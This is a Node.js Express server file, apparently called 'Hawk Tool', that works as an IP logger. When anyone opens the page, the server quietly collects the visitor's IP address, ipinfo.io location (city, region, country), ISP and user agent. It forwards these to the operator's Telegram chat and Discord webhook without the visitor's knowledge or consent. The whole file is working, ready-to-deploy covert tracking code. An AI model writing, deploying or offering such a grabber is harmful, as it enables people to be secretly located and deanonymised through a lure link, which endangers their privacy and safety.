const express = require('express');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const requestIp = require('request-ip'); // Import the request-ip middleware
const app = express();
const port = process.env.PORT || 3000;

// Load the configuration from config.json
const config = require('./config.json');

// Additional API endpoints to get location and ISP information
const IPINFO_API = 'https://ipinfo.io/';

// Initialize the Telegram bot if enabled
let bot;
if (config.telegram.enabled) {
  bot = new TelegramBot(config.telegram.botToken, { polling: false });
}

// Use the request-ip middleware to get the client's IP address
app.use(requestIp.mw());

app.get('/', async (req, res) => {
  try {
    // Get the user's IP address from the request object
    const clientIP = req.clientIp;

    // Get location and ISP information from ipinfo.io
    const locationResponse = await axios.get(`${IPINFO_API}${clientIP}/json`);

    // Extract relevant data from the response
    const { city, region, country, org } = locationResponse.data;

    // Additional device information
    const userAgent = req.headers['user-agent'];
    const platform = req.headers['user-agent-platform']; // You can customize this header

    // Create a message that includes IP, location, ISP, user-agent, and platform
    const message = `Hawk Tool Report 🦅\nUser IP: ${clientIP}\nCountry: ${country}\nState/Region: ${region}\nCity: ${city}\nISP: ${org}\nUser Agent: ${userAgent}\nPlatform: ${platform}`;

    if (config.telegram.enabled) {
      // Send the message to the specified Telegram chat ID
      bot.sendMessage(config.telegram.chatId, message);
    }

    if (config.discord.enabled) {
      // Send the message to the Discord webhook
      await axios.post(config.discord.webhookUrl, {
        content: message,
      });
    }

    res.send('Messages sent!');
  } catch (error) {
    console.error('Error sending messages:', error);
    res.status(500).send('Error sending messages.');
  }
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
